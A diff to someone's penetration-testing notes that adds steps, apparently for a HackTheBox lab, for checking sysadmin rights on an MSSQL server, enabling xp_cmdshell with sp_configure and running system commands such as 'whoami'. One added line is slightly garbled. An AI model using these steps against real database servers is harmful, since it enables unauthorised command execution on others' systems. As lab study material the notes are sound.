@@ -557,13 +557,31 @@ find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
 python mssqlclient.py ARCHETYPE/sql_svc@10.129.62.77 -windows-auth
 ````
 - https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
-
-
-
-
-
-
-
+- Check what is the role we have in the server
+````
+SELECT is_srvrolemember('sysadmin');
+````
+- If the output is 1 , it translates to True .
+- Check to see if `xp_cmdshell` is enabled
+````
+SQL> EXEC xp_cmdshell 'net user';
+````
+- Set up the command execution through the `xp_cmdshell`:
+````
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+````
+- First as it’s disabled by default:
+````
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+````
+- Now we are able to execute system commands:
+````
+xp_cmdshell "whoami"
+````
 ## Stuck
 - https://book.hacktricks.xyz/
 - https://guide.offsecnewbie.com/
